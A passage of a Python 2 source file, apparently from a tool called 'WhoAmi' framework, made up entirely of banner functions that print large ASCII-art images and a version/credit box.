  print "                     `+-`     `.` +./+:+``:/:/ymy/:+oohh/+`"                           
  print "                      :`   ```./-`.://`+:::odmy/:o++o/+yh/ "                            
  print "                     `--``-----os.:+/+/::sdmo/++-:+:/o+/ss/ "                               
  print "                      -o::-:::/+sosys/:ymdo/syy.`:/::-oo-.+- "                              
  print "                     `.o+-`  `   `:o:+mhoohs:+s.-/-/.-.`-:. "                                 
  print "                      `:o//:`       .:/+s+.`/o:s+/:++.:+. "                                 
  print "                       ..`-//+:.``   ````  `-o::`   :+-/`"                                
  print "                       ````.::``.---:-`    `.++//.-/:..-` "                                 
  print "                        `:/-` ``   .::/-..-://``..`+:::``"                                 
  print "                        ::`       `.`.-.+:.::      //`"                                
  print "                       -:`       `-  `+/-/--` `.:-./+."                                  
  print "                       `:-      -+.  ` /.``   `o-:--+s` "                                   
  print "                         `:- ` :o-   ``/.      o ` ``:: "                                    
  print "                          ++:-++.`  .:/:/:`    +`    .:` "                                       
  print "                         ./`````   `//``/o+`   ./  ``--` "                                     
  print "                        `+`       :-.`  .o:    `/---//` "                                      
  print "                       ./-        :+.   `/-`    ``` -+` "                                       
  print "                      `/-          .:.  ``+:`       `/. "                                        
  print "                       //           :/`   o/       `-:` "                                       
  print "                       .s:         .+-   `:`       `//."                                       
  print "                        -o.    ``  `/.   ..       ` ./- "                                          
  print "                         `o` `-o:--++`   `-.   -`   .:-`"                                        
  print "                          ::`:o/:--o/`     /-.:o///++-"                                       
  print "                          `:ydh:`  `/:     -y:--ydsoo`"                                       
  print "                           .ymhs:   -o.    `/. .ymyds "                                      
  print "                           .osdms.`  :s.`  `-/`//dyms` "                                      
  print "                          `-:++hd/`  `-+:.  .+::/dsm/:` "                                       
  print "                          `:/o/+d/`   `-sm: `+//sydN-. "                                        
  print "                           `.`-+o/`  .omNMo `+/./+hM:  "                                       
  print "                          ``-+y/:. `-hMMNh- `+-.-:/oo:-.` "                                       
  print "                      ```.---.`  ``+dmyh/`  ./-`://:-:ohy+."                                       
  print "                      `-ydso+///osmNd:``    ::``::/sdNNMMNms-`"                                      
  print "                      `oddhhddddddy/`      .dmhdmNMMMMMMMMMMm."                                       
  print "                         `     ``          `oyhhyyyyyyyysss+:`"                                        
  sem()





def banner_9():
  print default+"                                                                                  ` "   
  print "                                                                            ``./ "   
  print "                                                                       `.---:s:. "   
  print "                                                                 ```.-:-.```+.`  "   
  print "                                                              ``-:-/+`  `:/`    "   
  print "                                                             `-:--`   `+../.    "   
  print "                                                        .-/::-./      -+-`    "   
  print "                                                     .:/-`./-`-:`  `-:.`    "   
  print "                                                  `:+-`    .o/```.::`    "       
  print "                                                `:/--/  `-:-`.-/o.`    "     
  print "                                             ``-/.   ./-:-::-./-     "      
  print "                                         `.-::s/`  `-:///:.`::``   "    
  print "                        `            `.-:-../-.//.::/:-`:--/.    "      
  print "                    `.:os`` ``````..-:.``-::.--::-//` ```::`   "       
  print "          `-/----:--:+:/-::----..-+/` `::-::-``./:``-:-++.   "        
  print "        `-/-..--/-.--..---::----/-```-:.//. ``//.:::.`+-    "         
  print "      `-++.```.+-:/`         `::``-/-`//`  `:///-` `-s/   "           
  print "      `:::-:/:.//::`       `-/``:/.`:/`  `:s/:`   `::+` "          
  print "        `.:/.`-//:-`     `-/..::`.::`   -o+.   ` -/.+. "      
  print "            -/o:``.-::-`.++::. `///` `::-`    `-++/:.  "           
  print "              `-//. `-///+:` `//` `:+/.    `-o:.o-`   "         
  print "            ```.:://-`-+:  `:/`  ./:` `  `::./`--    "       
  print "   `:/::::::---.`   -/s` .//`  -/:`    .::` -: +`    "       
  print " `-dd:           `-/-././:`` .+:`    ./:`   o`.+`   "       
  print " `:y::::.      `./-` `o/`` -/:`   -+o:`    `+ :-    "      
  print "-::::/-`.://  ./-```//` `-o+.``.:/o:`      .:`+    "      
  print "      .//:/.-+s.``::` `-/:.-:o+:/o.        -:-:    "      
  print "-:::--.-:o/:+-`/++:-:/o/:--..`-/../   ``:. ::/. `` "    
  print ".:::::/:` `.++y+:-..``      .+/+``-:` /:/:`/.o-:yo "    
  print "           `hm/``         .:-` -+``/. /:/-.+:+/+-  "        
  print "           `/++/:/::-```-+s`    -+-++` `. `+o/.`            ``.:/+/:-`   "      
  print "              .:/-.:/.::.:-      -s`.:`   ::/              .+hmmmmmmmho-` "     
  print "        ``      `-++/-```/.``     -:`--+: -:-            `-hmmmohmmmyhmd:` "     
  print "      `/.+.-/```.:/.`.///:oo-`` `.+//+os:+o-.`  `    ``  .sNdmms.dy+:ymmh. "     
  print "      :--y.o/+/://///+..-/o.+:////+/:/o+:+-//--://-:/-.:/::::/::-`..oymmd. "   
  print "      `.s:/s.o//+/+-o:/+++--/+:+-/--.s-+::/:/+++o/////:::+:/-://ymmh+mmm+` "    
  print "       `+```   `+./  `++:  `        `: ` `:/o.   `:/o.    `-yddmmmmmmmh/` "    
  print "               :/+.  -o            .:-    .:-        .-+syyys+:.        ."   
  sem()




                                                                                
def banner_10():                                                                               
  print default+"                              -..`...--.`     .`  "                    
  print "                     .:`    ./:--//::::/+++++o+-:/`  "                            
  print "                     .:o---:.````.:/oo/:://:/++:-`    "                          
  print "                     .:.:+/.     `   ./o::/s:.    ``     "                  
  print "                      --:os+    `h/  ` -s:./oo+:-::`  `:` "                   
  print "                       `:````  `+s:     `h: -/:::-...--/` "                      
  print "                       :.  `+---s-:      o+  :. `````.:` "                  
  print "                      --.`-+. `/-.-      o/  `s/-.`./+. "                         
  print "                      `o///- -:` -`     .y+   ::/-.`   "                        
  print "                           .+.  ``      /++:` `/:/+/---`"                      
  print "                          `/`         `--:y/:.  .:-`` "                     
  print "                 `        -. ````.... .-+.o/:-:```.:::--"                     
  print "              `::::.``` `--. ````      `/+-//----....``"                     
  print "             `o.`-+::---+-              .++//+:-`"                     
  print "             -////+:...-:/             .:. .--.`"                   
  print "           `-:/--/`.:-`  -.  `.-.`           `.--.--.`"                  
  print "          ./.o.`/::  .--````//:`                   `.-:.`"                  
  print "         `:``/`-:`+.   .---//`.`                   `.. ./++-.`"                 
  print "          .--:-::::/-`      `:-`            `        -. `/+s/:/."              
  print "            .::::`//-.        .:-.         .-        `-  :.`o:`+/`"             
  print "             ::-- ./:-          `.---...` ./.         `  -- .+. ./`"              
  print "              .+`  `/.               ``-:-`+             :. .//  ::"              
  print "                                         .+:            `:` :./  `+"             
  print "                                          --           `:. ----   +"             
  print "                                          --        `:--` -:`:`  .-"              
  print "                                           --`  ..-/.o: `./.:`   /."              
  print "                                            `:-..` -:`+/`/::`   `/` "            
  print "                                              `.-:-..:-./o-    /++`    ` "           
  print "                                                 `+/``-+y-    .s:o:.``:-`"          
  print "                                                 :/ `-:yo     :/-`-:::. "         
  print "                                               -o:`:--/y/:    :--:.```.`"          
  print "                                            `-o+..:`-+`+./o.  `::--:/. "            
  print "                                           `:+. .:`-+- `--:+/--..--.  "             
  print "                                          .::`o:. /-`    `  `...`  "          
  print "                                        .:-:::s+:+/              "             
  print "                                       `-------..` "                  
  sem()                                                                                
                                                                                
                                                                                
                                                                                
def banner_11():                                                                               
  print default+"                    :---.-:-----------:--:.```````````.....`....-/+oo/ "            
  print "                    `..--.+``:/:/ooooooos//so/////////+++++++++++++++y "          
  print "                       ./+.`:s:-:osssssss/`:/````````````````````....+ "        
  print "                      ://:/oss:-:shhhhhhho-/s-----------/.----........ "        
  print "                   ./::.`.-:ss:-:+oo+++oso:+o::---:----:`"        
  print "                 .+ysoo-````.++:/syhhhhhh/.o`"            
  print "               .oyso+oyyo.```./:/o:-----/-:+ "                   
  print "              /yyo+++++oyy/.``-/+o::--`.+-:. "                              
  print "             +yy+++++++ooyys`/../o-``s:-:.  "                                   
  print "            /yy++++++syyo+/+-:.``:/`-s/-   "                                       
  print "           `yh++ooo+sys.    .--:::://:` "                                     
  print "           +yo++oyo+yy:        `````` "                                            
  print "          `yy+++++++yy- "                                               
  print "          /yo+++++++yy: "                                                     
  print "          sssooo++++ys/ "                                                 
  print "          /+osyyssssso/ "                                                  
  print "              `` ```    "                                            
  sem()




                                                                               
                                                                                
                                                                                
                                                                                
def banner_12():                                                                                
  print default+"                                                                       ```"     
  print "                    `.---------....--:++/:........`````````           `+o/  "    
  print "         ``````````.osyyys+++++/////syssssssysssso+so///+++:........../++/.`"    
  print "    .:://+++++++++/osyyyyssssyyysyyyyyoossssssssoo+so++++oso+/////////ooo+:`"     
  print "    -oooosssssoooo++syyyyssosyhhyysooooooo+/--......-.--....`````````"    
  print "    `ooosssssso+/-.`/ssso::`/oshyy/   `..`` "     
  print "     /sooooo+/-`    /oo:.----.:yhys`   "            
  print "     `+o+/-.`      -so+`      `oyyyo.  "                 
  print "      `.`          .//-        .oyyyo-` "                
  print "                                `+yyso.  "                
  print "                                  .+o. "                   
  print "                                    `"                      
  sem()                                                                               
                                                                                
def banner_13():                                                                     
  print default+"                           `.:+osyyyyyyhhyyyyyyso+:.`"                 
  print "                      `-+syys+:-``            ``-:+syys+-`  "                
  print "                   -+yyo:.                           `.:syy+."           
  print "                .ohs/`                                    `/yho."            
  print "             `+hy:`                                          `/yh/`  "           
  print "           .odo.                                                .sd+`  "          
  print "         `od+`                                                    `od+`"          
  print "        :ds`      `:.          ``..----------..``          .:`      `yd: "        
  print "      `sd-     -ymy.       `.......`.. .. -.`.-.....`       .hmy-     -ds`"      
  print "     -ds`  :/-hMN/      `..`  ..`  .-  ..  -`  `..  `..`      +NMy-/:  `yh. "      
  print "    :m+  .hy.mNy:.    ..`....-.    -`  ..  `-    .-....`..    ./yNd.hh.  om-"     
  print "   :m/ `.dM:oo/ss`  ..`    .-`....--.-//os/.--....`-.    `..  `ys/o+:Md.` +m-"     
  print "  .m+ /+/Mh.omNs  `-`     `-      -``hd:-dMy`-      -`     `-`  sNd+.dM/o: om."    
  print " `hs`:N++Nsmdo.  .-      `-      `-  ``./mh- -`     `-`     `-`  .odmsN/+N-`yh."   
  print " /m. yMo:my:+o` .-..``   -`      ..    -o.   ..      `-   ``..-. `o/:ym-sMs .m/ "   
  print "`do `dMh-/sNm. `-   ``..--..```  -`    :-    `-  ```..--..``  `-` .mNo/-hMh  sd` "   
  print "/m.`.sMh:NMy.  -`       -`  ```..-....:NN:....-..```  `-       `-  .hMm-hMo.`.m: "   
  print "sh //.mymm/-` .-        -       `-     --     -`      `-        -` .-+Ndhm.+/ ds "   
  print "do sd`+mh./y` -`       `-       `-  ..+oo/.`  -`       -`       .. `h:-dm/`mo sh "   
  print "N/ +Ms.s.sM+  -.```````.-```````.:oy..+dd/..yo:.```````-.```````.-  oMo.s.yM+ +d "   
  print "N/ -mMs`sMm`  -.```````.-`--:+osdMMs  :dh: `yMNdso+:--`-.```````.-  .NMo`yMm. +d "   
  print "do .oMN/mN/-` -`       `-yMMMMMMMMM-  `ys`  :MMMMMMMMMy-`       .. `-+Nd/NM+` sh "   
  print "sh +-+Nymh y: .-        /mMMMMMMMMM:  -NN-  /MMMMMMMMMm:        -` /s`hdhm/-/ do "   
  print "/m./m:.yN/.Ny  -`       +NMMMMMMMMMh` :MM- .dMMMMMMMMMN/       `-  hN.+Ny./m/-m: "   
  print "`do`yMh:+:+Mm` `-  ``...yMMMMMMMMMMMh`/MM:`hMMMMMMMMMMMy...`  `-` `mM///:dMs`sh`"   
  print " /m.`oNMh-+MN.+..-..``  dMMMMMMMMMMMMhoMModMMMMMMMMMMMMh  ``..-`./.NM/-hMNo .m/ "    
  print " `hy``:hMN+mN-/m-.-    .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM`   `-`-N:-NdoNMh:``yy`"   
  print "  .m+ +:-oddNo.mm-`-`  /MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM-  .-`:Nm.sNddo-/+ od`"    
  print "   -m/`yd+.-oh-yMm.`.-`oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo`-.`.mMs-h+--ods`+d-"     
  print "    -m+ :dNmy+:.mMs:s:.hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy.:s:yMd.:+ymNh: om-"       
  print "     .dy` -smMMmshN+:NhmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmdN:oNhsmMMms- `yh."       
  print "      `sd- ./-/oyhhNs:dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd:sNdhyo/:/. :mo`"      
  print "        :dy``ohys+++++:oymNMMMMMMMMMMMMMMMMMMMMMMMMMMNdy+:+++++syho`.yh- "       
  print "         `+do` -+ydmNNNNmhso/hMMMMMMMMMMMMMMMMMMMMh/oshmNNNNmdy+- .od+` "         
  print "           `+ds. `:/:----:+ymMMMMMMMMMMMMMMMMMMMMMMmy+:----:/:` -sd+`"            
  print "             `/yh/`-+ydmNMNmdNMMMMMMMMMMMMMMMMMMMMNdmNMNmdy+.`/hy/`"             
  print "                .+hy/`   `  `mMMMMMMMMMMMMMMMMMMMMd`  `   .+yh+. "              
  print "                   .+yys/.` .MMMMMMMMMMMMMMMMMMMMMN` `./syy/.  "               
  print "                      `./syyyMMMMMMMMMMMMMMMMMMMMMMyyys/.   "             
  print "                           ``-/osyhdmmNNNNmmdhys+/-`` "   
  sem()                          
                           

                                                                                
                                                                                
def banner_14():                                                                                
  print default+"                          `.........`         "          
  print "                      ``-.``        ...`              "      
  print "                      -.              `--             "           
  print "                     -.`................-:`           "          
  print "                    `:--`           ``  .:-           "         
  print "                  ` .::---:---`  `--..--`:-           "      
  print "               ```  -:.-.``..::./:.....-`/-          `"      
  print "               `  ``::``-::-.`- -..--.` `/:-`       `"        
  print "                  .-.::::://::. -++//+:` +:-.    "        
  print "                    :`:`    ``:` -````   `y-:`    "        
  print "                   -..-.``--/:` -/-.`  `:s/`                    `` "        
  print "                   `:-``//../+:///``.:-.:o.               `` "           
  print "                    `.:``.:--:``-::::-  o.   "         
  print "                      .:  ``--.---:-` `s:   "         
  print "                       `-`   -`-`   `./o   "         
  print "   `                  ...--  `-:   .-:+:.`    "          
  print "```                `.-./.---../:..--:`+-`....`  "            
  print "              `.....`  /` `.--````.-  s.    `.....`   "             
  print "       ``......        ./`   .--.:.  `s`          `.......`    "           
  print "  `.-...``              /-  --:`:--` ./                  `..-  "            
  print " `-`  ``                :.-.. -/` `.-/.     ``              .-  "           
  print " ..  ``                 -`.:` ./     :`                      -` "          
  print " : `                    ..   `:-.   `:   `                   -`  "           
  print " :                      `-   .- :   -`                       `-   "          
  print "..                       :   -` -. `-                         :   "         
  print "-.                       -` `:  `- -.                         ..   "          
  print "-.                       `- `:   :`:                          `-   "          
  print "-`                       `: -`   --.                           :   "         
  print "-`                        :`:    ::                            :`  "         
  print "-`                        `:-   ./.                            .-  "         
  print "-`                         /-   :/                              :  "        
  print "-`                         ./` `+`                              :  "         
  print "-`                         `::`::                               -` "        
  print "-`                          -:-+`                               -` "        
  sem()       
        
        



                                                                                
def banner_15():                                                                               
  print default+"       :-:::::::::::::::::::::::::::::::::::::::::::-:  ````.``````````````"   
  print "       ::.`````````````````````````````````````````.:/ .    -      `.     .`"   
  print "       :/`                                         `:/ .````--.....--....-- "   
  print "       :/`   WhoAmi{framework}                     `:/ .   `.`......-.....-"   
  print "       :/`                                         `:/ .   `..............."   
  print "       :/`                                         `:/`.   `` .`````.`````."   
  print "       :/`   github{amerlaceset}                   `:/``   `` .`    `    `."   
  print "       :/`                                         `:/``   ``  .    `    ``"    
  print "       :/`                                         `:/.`   .` ```  ``    ``"    
  print "       :/`   versions{1.0.0}                       `:/.`   .`...----------` "   
  print "       :/`                                         `:/.`   .  ` `````````."    
  print "       :/`                                         `:/.`   .             ."     
  print "       :/`                                         `:/.    .             . "     
  print "       /:-`````````````````````````````````````````--/.    .        `   `. "     
  print "       --:--:::::::::::::--::-----::--::::::::::::::-/-`   .        `   `` "    
  print "                           `-     ..            ````````` `.        `   `` "     
  print "                  ````````````-     `-```````    ````     `.``        `   .`"     
  print "               -:.............    `-.........``   `````` `..````````.```.  "     
  print "              ``-----------------------------:-       ``..`   "        
  print "   ```````````.`.`....`.`......`............`..`.```.``.`.        "        
  print "    ..o/o+++++/o/+/++++/o+o++++++++o+////////:/+/o/o++o+-.``````..--.` "       
  print "  ``/+//o++o+s+o++o+o+o+oo+o+o+oo+o+/-/--``..-:/oo+s/s+o..   ..-...` .`"      
  print "  .`o+/++o+oo/o/++/o/+/++/+/+/+o+o+o//+-.-:--.-//+/o++o.:``   ``.`..  . "   
  print "  ../:///::/:::////////////////////////--::-:---:::::::::.-     ```.```"   
  print " `.`````````````````````````````````````````````````````` `-.......``` ````"   
  print "                                                           `.......`.`````.`"   
  sem()

def banner_16():
  print default+"                                         "                                             
  print "            `      ```................```        `     "                                           
  print "        ``..---+o///++++/:---------.-:://////:-.-:.``     "                                           
  print "     `.-///::-..`                          ``...::-/+::-``  "                                          
  print "    -oo:.`` ` `  ``       ```````````      `       ``.-:+o-` "                                          
  print "   .o+`:///-.```...:///+++oo++ooo++///+++/--`` `-://o:` `:s:` "                                        
  print "   -o-`----/+..s+/--:/sy/:+s-.`.````-sysyhoos:`.+/-..``  `/+.  "                                      
  print "   :o.     `.:+m. `` `+/` `ho.``````-+. -o:`+hs:-.``  `   .ss:-`` ` ``"                                
  print "   -s+`.-//o//.:yso+ooho`  +sosssoo/+o. .os++my-/o++:---..+o--:++/` "                                 
  print "   `/hy+/-.```-odh-`...`  ` ``````````  ``.../dso-..-:++/+hys++-+Ns:.`  "                              
  print "    `:yo///+s+/-h:    `.:///+o/://oo/:.`  `.``s/.-++so+//oo.  .--++:+o-`  "                             
  print "   `  `.:::-` `+o   `-+ymdy/.oy/y++o-+so:`:o: :y  ` ``-:-.`       `.::/+-`` "                            
  print "         `` ` :y`  ./o/+y+/h/hssmyymyso:++.    d.                   `:+:++. "                            
  print "          `  -y.  `/+/ho+dmy+---:+hmdyo.`/o.`  s/                     -o/:/. "                          
  print "          ` .d.  `-h-`:/oy:`   `  `-ssoso:+/`  .d`  `                  .o+++`"                          
  print "           :y- `  -h-`/ssh/` ` ` ``-sds/s/:/.  `s-                     `-+/+- "                        
  print "          -y:` `  .o+.+symms/-`.:+ymdo-.``+/` ` :h   `           `````` .+/+/` "                         
  print "         -s-`   `  .++syoshohhsmNhho+o. .++``   `y:               ys+ho+o+-+- "                         
  print "        -o-     `-- `-ohd+``so/hs+h/-.:+s:`      :y`       `.:--  -o/sys/:o/`"                          
  print "       `o/`` ```o/+``` `:+++:/++oo+/oo/-`        `h:  `.```y+.-sy:.:yssy/:``"                          
  print "       .o-   `````````.`..`...----.```           `:+`:oo/.`:+:-/sso/+oo-`"                             
  print "       +s.  ./oo+:://+++++/////::-:/++::-.``     `:d-+:-ho../syy++o/-.`"                               
  print "       oy.  .:..```           ` ````...::://++/.  -doss+osoo//+:`"                                 
  print "       os.  `                             ``.---` /mso+o+:-:-.``"                                       
  print "    `` -s:`                                    ```h/--.`"                                         
  print "     ```:o/-.......`````                         -m- "                                      
  print "         `---:/+oooo++++////////+++o++/:------:/oyo`"                                           
  print "                    ````...............`"                                       
  sem()                                                                                                                      
                                                                                                                        
def banner_17():                                                                                                    
  print default+"                           `                                                      "       
  print "                  :/      /d`                        ``.-::::-.``      `                  "      
  print "     .`     os    os+``.``y:/                      -+ssso+/++osso+os+/oyy-     ``         "        
  print "     yo`   ++s    -ooysshh+do::-.`               -oh+.`        .:/+//+` -ys/////ys.```.-:. "       
  print "     +o+/.-s.s`    /y+yysmomo:.+d+             `os+`     `::.`     -o/o` `o-    `s+:::--.s. "        
  print "      -yysy++o/:. :s`.shhoss::s`:o.            +h:       o:.-//o    -o:+  :+     `s.     // "       
  print "      :y+ydy+.`./+:++ `:yssy` .s.ss           -ho    `/oyy+///:y    `y`s  .o      +:     :+  "      
  print "     -s``:/syy`   .yy//yNh.`   //-y-          :d/      `s/hoo+sys:   s-s  .o      +-     o-  "       
  print "     `s.`ysohm-    +o/+ooy.    `y++`          .mo-:-  `-yoy:-dy:-/`  s/+  :+     `s`    .s`  "       
  print "      ++--ydmo`   /o.s.s./:     dh.      `.:+//yyssso/yss/+oy.o+-   .ys. `s-     +/.   .s.  "        
  print "     `ys+sms.++` `/o+++sod:     :`:///+oyys+//+oy/+y-:s:s``s.-o/y  .so:``o:     -so-  .s. "          
  print "     .s-/.y.  /+   /hs+h/yo..`     .:/+y.       `/hoyshsh/h+ys`// `y++  .+`    `s-:  .s. "         
  print "     `:ooooo--:d+oyo/ods-.-:/+o+ooys++:y-..`..-///ss:od+y`-+odsyy s:y   `.:sso+/+`  .s` "           
  print "       `/+//ooh/s.: ` /y-..-----..`   .y--/:-.``  .s  +mhyyyd/--s.y:+    `o/o.oos`  o- "           
  print "          ``  o:`:+  -+h/  `s   `y`   .s  .s.     oo  // ``-dhys+od:h/////o++/o+o///oo`"            
  print "             /yy/+.`-os.s.`+/   `y`  `s-   .s`   .m/  +s+/-..ds.:hhss+:+h+/o.  .//:`/+ "             
  print "            :h/:++sy:-s`-hy. `///-  `o-    `/+`  .h+` +sosss`y+/+oo  .shdyy+s``yyyhho`"             
  print "            sy.`s- ./h-`hy..oo++syo/+d+o//+s:/+///:so .s.--o///+/o. `s/osh-o+:+ssshy- "              
  print "           .s.y-`o+++s--y.++/h:-s/s. s-/+..o`   .s:ss. +do+hs+//::///ss+dd/o//s+ydo/: "              
  print "          `s.-so/:-.o-+y-yo+/os-s..++.y.++.s-   /+o..+/:sy:--://////oshoddy/o:sodd:o- "               
  print "         `o-`s. `..-:.s.+s:-/-+d.  :o-yo:++`   `s.s`  `-//`         :+yy/ss:s`s+Ny:s` "               
  print "        `s- -y`     `s- :+-/os/h``++`so.-h.   `+/++                 .s+ysoo+` :o//o. "               
  print "       .y:..s.     `o-  .d-`s//:`-+///://.   .y+/o`                  `///o:    .-.  "                
  print "       `.----      -o/::+/                   ````                                  "                   
  sem()                                                                                                   



def banner_18():                                                                                                                       
  print default+"                           ````..``` "                                    
  print "                      .:osyyyssoooooosssoo/. "                                             
  print "                 `/oso:.``             ``-/+o+- "                                              
  print "               -ys/`                         ./s+`"                                             
  print "             .sd:`                             `/h+ "                                            
  print "            -dh`                                 -hy`"                                           
  print "           .dd.                                   -ms"                                          
  print "           +M/ -:                               :. oN."                                         
  print "           yN. yy`                              hh`-M+"                                        
  print "           sm. +s                               yy .Mo"                                         
  print "           /N: .m-                             /N/ /M:"                                         
  print "           `hy` hy       `            ```      hh``hh`"                                         
  print "            -ds`sd``:oyhhdhy+`     .shdddhs+-  do.yd. "                                        
  print "             .yhdy`yNMMMMMMMN:     oMMMMMMMMNs hmhs.  "                                        
  print "     ..`      `sM/`hMMMMMMMMm.     -NMMMMMMMMh +M/       .--` "                                   
  print "   `yhyh/      -N. -hMMMMMMd:  ` `  /mMMMMMMd- .No     .shhmo "                                   
  print "   :M+`-ho`    :d`  `/yddh+. `+h.y/  .+hmdy/`  `No    -dy``ym."                                   
  print "   .sy`  .yh+-.`:N:     ``    oMN:NN+    ``     /N:`./shs`  `sh-"                                 
  print "  `sdo`     ./oyyohh+/-.`     -NMN:mMN`     `.-/shysyhs/.     `smo`"                                
  print ":mh/://++/-`  .:osyNMdho-   -NNy`hNm`   -ohdNhso/-.  `-/++/::+mh`"                                
  print " .::::::/oyhy/.   .+NymMN+   :/` `:-   +NMh+m:`  `-+syso/:::::-`"                                
  print "           .:oyy+-..hy/NMm.``````````.-mMM-+s`.:oys/-`"                                   
  print "               `-+ssmh`dMs++/:o-o/+/+o:hMy hhoo/-`"                                      
  print "                  `:dh oMssoo+y.y/o/+o/sN:.ms`"                                      
  print "               `/shyhm``+os+//o.s:s:/+oo/ oNssy+:.` "                                     
  print "     .::::::/oshs/. `ds`  `-/:+/+/+::.`  :Mh` `:oyhyo:+++/- "                                    
  print "    :Ndooo+/:-`  `./odmy-`             .oNNdo:`   `.:/+ooohs "                                   
  print "     .ym+`     `:ohy+:``/hho/-.`````.-/sdd+`./sys+-`     `+Ns`"                                   
  print "       .yy`  .yds:`       `:+ssyssssso/-`       `.+hh.  `yh/. "                                    
  print "        :No -ds`                                   `od. oN. "                                     
  print "        `ymhd/                                       /dhms "                                      
  print "          ``                                           `` "                                       
  sem()                                                                                                   
                                                                                                   
                                                                                                   
                                                                                                   
                                                                                                   
                                                                                                                                                                                                                           
                                                                                                                        
                                                                                                                        
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
def banner_19():                                                                                                    
  print default+"                                            ````````````  "                    
  print default+'''         `://-::.`                          `-++syhs` '''
  print default+'''          dNNNNNNNds-                      `odNNmddmm`'''
  print default+'''          /mmmmdddmNdo-                   :hmdhhddmN+ '''
  print default+'''           /Nmmdddhhho++`     ''' +red+'WhoAmi'+default+'''     /hdhhhhhhdm-'''
  print default+'''            hmdhhhyho/s/o.              /ddhhyyyyyhm:'''
  print default+'''            omdyyyso/.-s/s.            .hhdyyyysssyho '''
  print default+'''            omdyyyys+-..o/s```..```.``.oddyyo+/:://oo`'''
  print default+'''            /mddysss+::-.+y/``..``...`.ymhhho/:.-/+s/`'''
  print default+'''            `+ddyyss/---.`sh.``-``...`.hdyyhssss+::::/++:`'''
  print default+'''          -+syyyyyyy:oo:..-y: `````..``dsyyyyhhh/--:+sdNNm:''' 
  print default+'''        .smmdhysosyy.-:...-+y//``  ``:-mdhhhyyysoshddmmNNNN/'''
  print default+'''        ymmdsyyyssso/::-:/+yNd/`     /dNNdyhhhhhshdmmmmmNMMm`'''
  print default+'''       +mmmhosyyyys::+shdmNNd:`.-    ::sdddhddddhhdmmmmmNMN/'''
  print default+'''       oNmmhyyyyhdhhhdhhs/+---``-` ``/.`-.:`:+odh+sydmNMNy-'''
  print default+'''     ``.+mmmmddmmdysmh//-.:--.:.-....:-.---..........:+/-`'''
  print default+'''       ..-ohNNNho::://::://+////::::::::::::-----.......`'''
  print default+'''        `...---------:::::::::::::------------.......````'''
  print default+'''           `````````````...........```````````````````'''                                       
  sem()                                                                                                                                                                              
                                                                                                                        
                                                                                                                        
def banner_20():                                                                                                                        
  print default+"  ``   ``  ``   ``  ``   ``  ``  ```  `` `-//ossyyyysso//-` ``  ```  ``  ``   ``  ``   ``  ``   ``"   
  print "``   ``  ``  ```  ``  ``   ``  ``   .:oymNNdhysoooooosyhdNNmyo:.   ``  ``   ``  ``  ```  ``  ``   ``"   
  print "  ``   ``  ``   ``  ``   ``  ``  .+hNNho:.```  ``  ``  ```.:ohmNh+.  ``  ``   ``  ``   ``  ``   ``  "   
  print "``   ``  ``   `   ``  ``   `` `/hNms:.` ``  ``.------.``  `` `.:smNh/` ``   ``  ``   `   ``  ``   ``"   
  print "   `   ``  ``   `        `  `+mNy:``   `-+shmNNmmddmmNNmhs+-`   ``:yNmo`  `        `   ``   `   `   "    
  print "  ``   ``  ``   ``  ``   ```yMy-``` `/ymNdy+:-.``````.-:+ydNmy/` ```-yMh```   ``  ``   ``  ``   ``  "    
  print "``   ``  ``  ``   ``  ``   .mM:`` -smNh/.``  ``  ``  ``   `./ymms- ``:Mm.   ``  ``   ``  ``  ``   ``"   
  print "  ``   ``  ``   ``  ``  ``` sMNyshNmo.``  ``   ``  ``   ``  ``.omNhshNMo ```  ``  ``   ``  ``   ``  "   
  print "``  ```  ``  ```  ``  ``  `+NN+ooo:.``  ``   ``  ``  ``   ``  ``.:+oo+NN+`  ``  ``  ```  ``  ```  ``"   
  print "  ``   ``  ``   ``  ``  ``+Nm:`  ```  ``  ``   ``  ``   ``  ``  ```  `:mN+``  ``  ``   ``  ``   ``  "   
  print "``  ```  ``  ```  ``  `` :NN:  ``   ``  ``   ``  ``  ``   ``  ``   ``  :NN: ``  ``  ```  ``  ``   ``"   
  print "  ``   ``  ``   ``  ``  .dM+ ``  ``   ``  ``   ``  ``   ``  ``   ``  `` +Md.  ``  ``   ``  ``   ``  "   
  print "``  ```  ``  ```  ``  ``+Md``  `-/+o+:. ``   ``  ``  ``   `` .:+++/-`  ``dM+``  ``  ``   ``  ```  ``"   
  print "  ``   ``  ``   ``  `` `hMo  `-hmdyyhmms. ``   ``  ``   `` .smmhyydmh-`  oMh` ``  ``   ``  ``   ``  "   
  print "                       `mM/`.:mM+.```.yMy`                `yMy.```.+Mm:.`/Mm`                       "   
  print "``  ```  ``   ``  ``  ``mMyhmmMN`   ``-NN-   ``  ``  ``   -NN-``   `NMmmhyMm``  ``  ``   ``  ```  ``"   
  print "  ``   ``  ``   ``  `` `dMNy:-NM-``   `hMo``   ``  ``   ``oMh`   ``-MN-/yNMd` ``  ``   ``  ``   ``  "    
  print "``  ```  ``  ```  ``  .yMMd`` yMs   `` +Md`  ``  ``  ``  `dM+ ``   sMy ``dMMy.  ``  ```  ``  ```  ``"   
  print "  ``   ``  ``   ``  ``yMhmN: `/Mm```  `-NN-`   ``  ``   `-NN-`  ```mM/` :NmhMy``  ``   ``  ``   ``  "   
  print "``  ```  ``  ```  `` -NN-+Md. `NM:  `` `hMo  ``  ``  ``  oMh` ``  :MN` .dM+-NN- ``  ```  ``  ```  ``"   
  print "  ``   ``  ``   ``  `/Md``sMh``yMs``  ``+Md`   ``  ``   `dM+``  ``sMy``hMs``dM/`  ``   ``  ``   ``  "   
  print "``  ```  ``  ```  `` :Mm. `+o` /Mm` ``  -NN- ``  ``  `` -NN-  `` `mM/ `o+` .mM: ``  ```  ``  ```  ``"   
  print "  ``   ``  ``   ``  ``hMo``  ```NM:   ```hMo   ``  ``   oMh```   :MN```  ``oMh``  ``   ``  ``   ``  "   
  print "``   ``  ``   ``  ``  .dMs.``   yMs ``  `+Md```  ``  ```dM+`  `` sMy   ``.sMd.  ``  ``   ``   `   ``"   
  print "     `    `   ``  `    .yNm+.`` :Mm``    .NN-    ``  ``-NN.    ``mM: ``.+mNy.   ``  ``   `    `   ` "   
